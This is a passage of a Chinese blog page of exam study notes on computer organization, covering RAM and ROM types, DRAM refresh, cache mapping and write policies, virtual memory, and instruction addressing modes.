class="markdownIt-Anchor" href="#1随机存储器ram">#</a> 1，随机存储器 RAM</h6><p>RAM 的任意一个单元都可以随机存取，而且存取时间和存储单元的物理位置无关。<br>RAM 分为静态 RAM 和动态 RAM。</p><ul><li>1，<strong>SRAM（静态 RAM）</strong> 的存储元使用双稳态<strong>触发器</strong>（六晶体管 MOS）来记忆信息的，是<strong>非破坏性读出，不需要刷新</strong>。特点：存取速度快，集成度低，功耗大价格贵，一般用于 Cache 高速缓存。（<strong>送行列地址时同时送，故地址线即存储大小</strong>）</li><li>2，<strong>DRAM（动态 RAM）</strong> 是利用存储元电路中栅级电容上的电荷来存储信息的。但是 DRAM 因为漏电使其电容上的电荷衰减，需要通过刷新，且其读出是<strong>破坏性读出</strong>。（<strong>送行列地址时分开送，故地址线为正常 SRAM 的一半，不过由于其有行选通列选通，故片选线为 2 条</strong>）</li><li>注意有的题计算二者芯片的引脚数目：除了根据容量大小的地址线，还有 2 条读写控制线（也可以用 1 条），片选线（SRAM1 条，DRAM2 条分别为行选通和列选通）<br><strong>附加：DRAM 的三种刷新方式</strong></li><li>1，集中刷新：指在一个刷新周期内，利用一段固定的时间，依次对存储器的所有行进行逐一再生，在此期间停止对存储器的读写操作，称为 “死时间”。优点是：读写操作时不受刷新工作的影响。缺点是：在集中刷新期间（死区）不能访问存储器。</li><li>2，分散刷新：把对每行的刷新分散到各个工作周期中。这样一个存储器的系统工作分为两部分：前半部分正常读写或者保持，后半部分用于刷新。这种刷新方式的优点是没有死区，但是由于其刷新频率较高，增加了系统的存取周期，降低了整机的速度。</li><li>3，异步刷新：前两种方式的结合。即可缩短 “死时间”，又能充分利用最大刷新间隔为 2ms 的特点。做法是将刷新周期除行数，得到两次刷新操作之间的间隔 t，利用逻辑电路每隔 t 时间产生一次刷新请求。这样可以避免使 CPU 连续等待过长的时间，而且减少了刷新次数，从根本上提高了整机的效率。</li><li><strong>DRAM 刷新注意</strong>：1，刷新不依赖于外部的访问。2，动态 RAM 的刷新<strong>单位是行</strong>，由芯片内部自行生成行地址。3，刷新操作类似于<strong>读操作</strong>，但又有不同。刷新时不需要片选，即整个存储器中的所有芯片全部刷新。<br><strong>半导体存储芯片的基本结构</strong><br> 1，存储矩阵：大量相同的位存储单元阵列构成<br> 2，译码驱动：将来自地址总线的地址信号翻译为对应存储单元的选通信号，该信号在读写电路的配合下完成对被选中单元的读 / 写操作。<br>3，读写电路：包括读出放大器和写入电路，用来完成读 / 写操作。<br>4，读 / 写控制线：决定芯片进行读 / 写操作<br> 5，片选线：确定哪个存储芯片被选中。用于容量扩充。<br>6，地址线：单项输入的，其位数于存储字的个数有关。<br>7，数据线：双向的，其位数与读出或写入的数据位数有关。</li></ul><h6 id="2只读存储器-rom"><a class="markdownIt-Anchor" href="#2只读存储器-rom">#</a> 2，只读存储器 ROM</h6><p>ROM 存储器的内容只能随机读出而不能写入。广义上的 ROM 已经可以通过电擦除等方式进行写入，故 ROM 和 RAM 的区别主要是 ROM 断电内容保留的特性。<br>种类繁多：MROM（掩模式只读存储器 -&gt; 写入后任何人无法更改内容）,PROM（一次可编程只读存储器）,EPROM（可擦除可编程只读存储器）,Flash ROM（在不加电情况下长期保存信息，又能在线进行快速擦除和重写。<strong>注意：写速度比读速度慢很多</strong>），SSD（固态硬盘 -&gt; 容易磨损）等很多类。</p><h6 id="3串行访问存储器sam"><a class="markdownIt-Anchor" href="#3串行访问存储器sam">#</a> 3，串行访问存储器（SAM）</h6><p>对存储单元读写时，需要按照物理位置的先后顺序寻址。<strong>磁带</strong>。</p><h5 id="4直接存取存储器das"><a class="markdownIt-Anchor" href="#4直接存取存储器das">#</a> 4，直接存取存储器 DAS</h5><p>按照信息所在地址的<strong>控制字编码</strong>形式寻址。成块进行存取。<strong>磁盘。</strong></p><h5 id="三按照计算机中的功能作用分类"><a class="markdownIt-Anchor" href="#三按照计算机中的功能作用分类">#</a> 三，按照计算机中的功能（作用）分类</h5><h6 id="1主存储器内存"><a class="markdownIt-Anchor" href="#1主存储器内存">#</a> 1，主存储器（内存）</h6><ul><li>存放计算机运行期间的大量程序和数据，CPU 可以直接访问，也可以和 Cache（高缓）以及辅助存储器交换数据。</li><li>包括 RAM 和 ROM。由 MOS 半导体存储器构成。</li></ul><h6 id="2辅助存储器外存"><a class="markdownIt-Anchor" href="#2辅助存储器外存">#</a> 2，辅助存储器（外存）</h6><ul><li>存储当前暂时不用的程序和数据</li></ul><h6 id="3高速缓存存储器cache"><a class="markdownIt-Anchor" href="#3高速缓存存储器cache">#</a> 3，高速缓存存储器（Cache）</h6><ul><li>位于主存和 CPUT 之间，存放 CPU 经常使用的数据和指令。</li><li>双极型半导体存储器或 MOS 型的 SRAM 构成。</li></ul><h6 id="4控制存储器控存cm"><a class="markdownIt-Anchor" href="#4控制存储器控存cm">#</a> 4，控制存储器（控存，CM）</h6><ul><li>为程序设计的计算机用控存来存放解释执行机器指令的微程序</li><li>构成为 ROM</li><li><strong>注意：属于计算机五大硬件中控制器的一部分而不是存储器，这里写上只是其作用和构成与各个存储器相似。</strong></li></ul><blockquote><p><strong>速度和单位价格均为：Cache &gt; 主存 &gt; 辅存</strong><br><strong> Cache - 主存：解决了主存和 CPU 速度不匹配的问题</strong><br><strong>主存 - 辅存：解决了主存容量不够的问题</strong></p></blockquote><h4 id="存储器性能指标"><a class="markdownIt-Anchor" href="#存储器性能指标">#</a> 存储器性能指标</h4><h5 id="1存储容量"><a class="markdownIt-Anchor" href="#1存储容量">#</a> 1，存储容量</h5><p>存储容量 = 存储字数 * 字长</p><h5 id="2单位成本"><a class="markdownIt-Anchor" href="#2单位成本">#</a> 2，单位成本</h5><p>单位成本 = 总成本 / 总容量</p><h5 id="3存储速度-font-colorgreen重点font"><a class="markdownIt-Anchor" href="#3存储速度-font-colorgreen重点font">#</a> 3，存储速度 <font color='green'>重点</font></h5><ul><li>①<strong>存取时间 (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">T_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)</strong>：从启动一次存储器操作到完成该操作所经历的时间，分为读出时间和写入时间。（即孤立地考察一次 R/W 操作所需要地时间）</li><li>②<strong>存取周期 (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">T_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)</strong>：指存储器进行一次完整的读写操作所需的全部时间，即连续两次独立访存操作之间所需的最小时间间隔。</li><li>③<strong>主存带宽 (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">B_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>m</mi></msub><mo>=</mo><mi>W</mi><mi mathvariant="normal">/</mi><msub><mi>T</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">B_m = W / T_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 。 W 为每次 R/W 操作数据的宽度，一般等于 Memory 的字长。</li><li>注意：<strong>存取周期和存取时间的主要区别：存取时间仅为完成一次读写操作的时间，而存取周期还包含操作后线路恢复的时间，即 存取周期 = 存取时间 + 恢复时间</strong></li></ul><h4 id="多模块存储器"><a class="markdownIt-Anchor" href="#多模块存储器">#</a> 多模块存储器</h4><p>多模块存储器是一种空间并行技术，利用多个结构完全相同的存储模块的并行工作来提高存储器的吞吐率。</p><h5 id="1单体多存储器ppt上没有只有一个双端口存储器"><a class="markdownIt-Anchor" href="#1单体多存储器ppt上没有只有一个双端口存储器">#</a> 1，单体多存储器（PPT 上没有，只有一个双端口存储器）</h5><p><strong>双端口 RAM（这里写一下 PPT 的介绍）</strong></p><ul><li><strong>端口的含义</strong>：指读写口</li><li>Cache 使用的便是双端口设计，即存储器能同时和两个设备进行信息传输？<br>单体多字存储器是一个存储器中只有一个存储体，每个存储单元存储 m 个字，总线宽度也为 m 个字。一次并行读出 m 个字，地址必须顺序排列并处于同一存储单元。在一个存取周期内，从同一个地址取出 m 条指令，然后将指令逐条送到 CPU 执行，即 1/m 个周期向 CPU 送一条指令。这种方式的好处是提高了单体存储器的工作速度，但是要求指令和数据在主存内必须是连续存放的，一旦遇到转移指令或者不连续存放效果就不明显。<br>效果上类似于扩大了每个存储单元的位数，原本可以放一条指令的存储单元扩大成可以放四条指令，在取的时候直接将四条指令全部取出来然后一条一条送到 CPU 处理，取指令的速度变快了，但是如果指令不连续存放，就是说一口气取出来的不是同一个操作需要的指令，这种情况下还是需要分几次去取，效果就不是那么明显</li></ul><h5 id="2多体并行存储器-提高系统的存储性能"><a class="markdownIt-Anchor" href="#2多体并行存储器-提高系统的存储性能">#</a> 2，多体并行存储器 -&gt; 提高系统的存储性能</h5><h6 id="1高位交叉编址顺序方式"><a class="markdownIt-Anchor" href="#1高位交叉编址顺序方式">#</a> （1）高位交叉编址（顺序方式）</h6><p>高位地址表示体号，低位地址表示体内地址。高位交叉方式下，总是把地位的体内地址送到由高位体号确定的模块内进行译码。注意：CPU 总是按照顺序访问存储模块，各模块不能并行访问（因为各个模块相差地址位数较大不连续），因而不能提高存储器的吞吐率。</p><h6 id="2低位交叉编址交叉方式"><a class="markdownIt-Anchor" href="#2低位交叉编址交叉方式">#</a> （2）低位交叉编址（交叉方式）</h6><p>低位地址为体号，高位地址为体内地址。（这样访问<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">M_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 后可以直接访问<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 地址，其是连续的）</p><h4 id="主存储器和cpu的链接考点是扩展存储器sram和dram"><a class="markdownIt-Anchor" href="#主存储器和cpu的链接考点是扩展存储器sram和dram">#</a> 主存储器和 CPU 的链接（考点是扩展存储器 SRAM 和 DRAM）</h4><h5 id="连接原理"><a class="markdownIt-Anchor" href="#连接原理">#</a> 连接原理</h5><ul><li>主存储器通过数据总线，地址总线和控制总线与 CPU 连接。</li><li>数据总线的位数和工作频率的乘积正比于数据传输率</li><li>地址总线的位数决定了可寻址的最大内存空间</li><li>控制总线（读 / 写）指出总线周期的类型和本次输入 / 输出操作完成的时刻</li></ul><h5 id="主存容量的扩展"><a class="markdownIt-Anchor" href="#主存容量的扩展">#</a> 主存容量的扩展</h5><p><strong>1，位扩展</strong><br>数据位不够进行位扩展，数据总线连接需要改变。<br><strong>2，字扩展</strong><br>如果数据位长度相等，字扩展通过片选位来进行不同芯片的选择，通过高地址位接入译码器来控制片选信号进行字扩展。<br><strong>3，字位同时扩展</strong><br>当数据位和字都不够时，需要进行字位同时扩展。</p><h6 id="连接时注意事项"><a class="markdownIt-Anchor" href="#连接时注意事项">#</a> 连接时注意事项</h6><ul><li>1，合理选择芯片</li><li>2，地址线的连接，一般高位用来片选，低位连接芯片地址线</li><li>3，数据线的连接，进行位扩展时需要注意</li><li>4，读 / 写命令线的连接，读写可能需要 1 个或者 2 个引脚（读写分开位 RD，WE）</li><li>5，片选线的连接，进行字扩展时需要注意，片选决定了存储芯片的使能状态。</li></ul><h4 id="高速缓冲存储器"><a class="markdownIt-Anchor" href="#高速缓冲存储器">#</a> 高速缓冲存储器</h4><h5 id="程序访问的局部性原理"><a class="markdownIt-Anchor" href="#程序访问的局部性原理">#</a> 程序访问的局部性原理</h5><ul><li>时间局部性：最近的未来要用的消息，很可能是正在使用的信息，因为程序中出现循环。</li><li>空间局部性：指未来要用的消息，很可能与现在使用的信息在存储空间上临近。</li></ul><h5 id="cache的工作原理"><a class="markdownIt-Anchor" href="#cache的工作原理">#</a> Cache 的工作原理</h5><p>CPU 发出读请求时，若 Cache 中命中，则转换为 Cache 地址，否则从内存中读写。下面介绍几个名词。<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo>=</mo><msub><mi>N</mi><mi>c</mi></msub><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>N</mi><mi>c</mi></msub><mo>+</mo><msub><mi>N</mi><mi>m</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H = N_c / (N_c + N_m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> Cache 的总命中次数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">N_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，访问主存次数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">N_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , 命中率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi></mrow><annotation encoding="application/x-tex">H</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span></span></p><h5 id="重点-cache和主存的映射方式"><a class="markdownIt-Anchor" href="#重点-cache和主存的映射方式">#</a> （重点） Cache 和主存的映射方式</h5><h6 id="1直接映射"><a class="markdownIt-Anchor" href="#1直接映射">#</a> 1，直接映射</h6><p>主要公式 <strong>Cache 行号 = 主存块号 mod Cache 总行数</strong><br>直接映射的地址结构如下：<br>``| 标记 | Cache 行号 | 块内地址 |<br><img src="https://pic3.zhimg.com/80/v2-3281b09fe554d06d1f0a7c3582a5a65a_720w.webp" alt="直接映射"></p><h6 id="2全相联映射"><a class="markdownIt-Anchor" href="#2全相联映射">#</a> 2，全相联映射</h6><p>主存中的每一块可以插入 Cache 的任何位置。<br>地址结构<br> <code>|标记 | 块内地址|</code> <br><img src="https://pic3.zhimg.com/80/v2-dac5bfcf4320627d7382756d787e9282_720w.webp" alt="全相联映射"></p><h6 id="3组相联映射"><a class="markdownIt-Anchor" href="#3组相联映射">#</a> 3，组相联映射</h6><p>将 Cache 分成 Q 个大小相等的组，组间采用直接映射，组内采用全相联映射。<br><strong>Cache 组号 = 主存块号 mod Cache 组数</strong><br> <code>| 标记| 组号| 块内地址|</code> <br><img src="https://pic2.zhimg.com/80/v2-472544d30167b0d77932054da9636e3d_720w.webp" alt="组相联映射"></p><h5 id="cache中主存块的替换算法"><a class="markdownIt-Anchor" href="#cache中主存块的替换算法">#</a> Cache 中主存块的替换算法</h5><p><strong>（1）随机算法</strong>：随机地确定替换的 Cache 块。<br><strong>（2）先进先出算法</strong>：选择最早调入的行进行替换。<br><strong>（3）近期最少使用算法（LRU）</strong>：依据程序的局部性原理，选择近期内长久为访问过的 Cache 行进行替换的行。<br><font color="red"> （考点） </font></p><h5 id="cache的写策略"><a class="markdownIt-Anchor" href="#cache的写策略">#</a> Cache 的写策略</h5><p><code>对于Cache写命中</code> <br>（1）全写法：写命中时，同时写入 Cache 和主存。<br>（2）回写法：写命中时，只把数据写入 Cache，不立即写入主存，只有当此块被换出时写入主存。(有一个脏位来决定是否写入主存)<br> <code>对于Cache不命中</code> <br>（1）写分配法：加载主存的块到 Cache 中，并更新这个 Cache 块。<br>（2）非写分配法：指写入主存，不进行调块。</p><h4 id="虚拟存储器"><a class="markdownIt-Anchor" href="#虚拟存储器">#</a> 虚拟存储器</h4><h5 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念">#</a> 基本概念</h5><p>主存和辅存共同构成了虚拟存储器，二者在硬件和系统软件的共同管理下工作。对于程序员而言，虚拟存储器是透明的。<strong>用户变成允许涉及的地址称为逻辑地址（虚地址）。</strong><br>其分为<strong>页式和段式虚拟存储器两种</strong>。</p><h6 id="font-colorred-重点虚拟存储器和cache的比较font"><a class="markdownIt-Anchor" href="#font-colorred-重点虚拟存储器和cache的比较font">#</a> <font color='red'> 重点：虚拟存储器和 Cache 的比较</font></h6><p><strong>1，相同之处。</strong></p><ul><li>最终目标都是为了提高系统性能</li><li>都把数据划分为小信息块，并作为基本的传递单位，虚存系统的信息块更大</li><li>都有地址的映射，替换算法和更新策略</li><li>依据程序的局部性原理应用 “快速缓存的思想”。<br><strong>2，不同之处</strong></li><li>Cache 主要解决<strong>系统速度</strong>，虚拟存储器是为了<strong>解决主存容量</strong>。</li><li>Cache 全由硬件实现，是硬件存储器，对程序员透明；虚拟存储器由 OS 和硬件共同实现，对系统程序员不透明，对应用程序员透明。</li><li>对不命中的性能影响，CPU 速度约为 Cache 的 10 倍，而主存的速度约为硬盘额 100 倍，故虚拟存储器不命中对系统性能影响更大。</li><li>CPU 和 Cache 和主存建立了直接访问的通道，而辅存和 CPU 没有直接通路。</li></ul><h3 id="考试题可能考点"><a class="markdownIt-Anchor" href="#考试题可能考点">#</a> 考试题可能考点</h3><p>1，显示器的刷新贷款。 刷新带宽 W = 分辨率 × 像素点颜色深度 × 刷新速率<br> 2，为提高刷新存储器带宽，可采用下面的技术：①采用高速 DRAM 芯片。②采用多体交叉存储器。③刷新存储器至显示控制器的内部总线宽度加倍。④采用双端口存储器将刷新端口和更新端口分开。<br>3，采用数据 Cache 和指令 Cache 分离的主要目的是<strong>减少指令流水线资源冲突</strong>。<br>4，主存向 CPU 传送信息的数据宽度为<strong>字</strong>，将信息传送到 Cache 的数据宽度为<strong>块</strong>。<br>5，对于由高速缓存，主存，硬盘构成的三级存储体系，CPU 访问存储系统时发送的地址为<strong>主存物理地址</strong>。</p><h3 id="一些例题"><a class="markdownIt-Anchor" href="#一些例题">#</a> 一些例题</h3><p><strong>1，半导体 SRAM 和 DRAM 的存储信息的原理有什么不同？为什么 DRAM 存储器需要刷新而 SRAM 不需要？</strong><br>解答：SRAM 存放信息靠的是触发器的双稳态；DRAM 存储信息主要依据 MOS 管栅级上有无电荷。<br>由于漏电阻的存在，DRMA 存储单元经过一段时间后会泄放掉其充积的电荷，导致信息丢失或错误；为了保证存储信息的正确性，需要每隔一段时间为 DRAM 所有单元电路进行充电，成为刷新。</p><h1 id="第四章-指令系统"><a class="markdownIt-Anchor" href="#第四章-指令系统">#</a> 第四章 指令系统</h1><p>【概念】一台计算机所能执行的全部指令的集合。<strong>指令系统时计算机软 / 硬件地界面</strong></p><h3 id="指令格式"><a class="markdownIt-Anchor" href="#指令格式">#</a> 指令格式</h3><p>一，一般的指令格式</p><ul><li>由操作码和地址码构成</li><li>操作码：指明操作性质，有定长和变长格式，位数取决于操作种类</li><li>地址码：指明操作数位置，常见有三地址，二地址，单地址，等等<br>二，选择和确定各类指令格式应该考虑的因素</li><li>1，指令长度应该尽可能地短：节省存储空间并提高处理速度</li><li>2，指令长度与机器字长应该是 8 位地整数倍：充分利用存储空间</li><li>3，指令操作码字段应该有足够的位数<br>关于操作码定长和变长，一般用来出题：例如零地址指令 X 条，一地址指令 Y 条，求能有多少二地址指令（指令字长 16 位，地址码 6 位）。类似上面地题<br>三，指令地种类</li><li><strong>地址格式分：单地址，二地址，零地址</strong></li><li><strong>指令使用权限：1，特权指令（只有系统软件才能使用 -&gt; 停机指令，I/O 指令。2，非特权指令：编程时可以直接使用地</strong></li><li><strong>指令地适用范围：1，通用指令。2，专用指令</strong></li><li><strong>指令操作性质分：1，数据传送指令。2，算数运算指令。3，逻辑运算指令。4，移位指令。5，字符指令。6，程序控制（转移）指令 -&gt; 这里有转移指令，循环控制指令，过程调用和返回指令，陷阱指令。</strong></li></ul><h3 id="指令地寻址方式"><a class="markdownIt-Anchor" href="#指令地寻址方式">#</a> 指令地寻址方式</h3><p>寻址方式是指寻找指令或操作数有效地址的方式，即确定本条指令地数据地址及下条待执行指令地地址地方法。寻址方式称为<strong>指令寻址和数据寻址</strong>两大类。</p><h4 id="指令寻址"><a class="markdownIt-Anchor" href="#指令寻址">#</a> 指令寻址</h4><ul><li>（1）顺序寻址：通过 PC+1，自动形成下条指令地地址。</li><li>（2）跳跃寻址：通过转移类指令实现。</li></ul><h4 id="数据寻址"><a class="markdownIt-Anchor" href="#数据寻址">#</a> 数据寻址</h4><p>数据寻址指令的格式：  <code>|操作码 | 寻址方式| 形式地址</code></p><h5 id="1立即寻址"><a class="markdownIt-Anchor" href="#1立即寻址">#</a> 1，立即寻址</h5><p>形式地址即操作数本身。优点：不访问主存，指令执行时间短。但是 A 地位数限制了立即数地范围。</p><h5 id="2隐含寻址"><a class="markdownIt-Anchor" href="#2隐含寻址">#</a> 2，隐含寻址</h5><p>不明显给出操作数地地址，而在指令中已经隐含了操作数地地址，比如单地址指令格式就不明显在地址字段指出第二操作数地地址，二十规定 ACC 累加器作为第二操作数地址。</p><h5 id="3直接寻址"><a class="markdownIt-Anchor" href="#3直接寻址">#</a> 3，直接寻址</h5><p>指令字中地形式地址 A 是操作数地真实地址 EA。形式简单，指令执行中只访存一次。A 地位数决定了操作数地寻址范围。</p><h5 id="4间接寻址"><a class="markdownIt-Anchor" href="#4间接寻址">#</a> 4，间接寻址</h5><p>指令地址字段给出的是真正地址的地址。间接寻址可以是多次间接寻址。优点是扩大可寻址的范围，但是需要多次访存，速度较慢。故一般扩大寻址范围时使用的是寄存器间接寻址。</p><h5 id="5寄存器寻址"><a class="markdownIt-Anchor" href="#5寄存器寻址">#</a> 5，寄存器寻址</h5><p>指令字中给出操作数所在的寄存器编号。故指令执行阶段不访问内存。</p><h5 id="6寄存器间接寻址"><a class="markdownIt-Anchor" 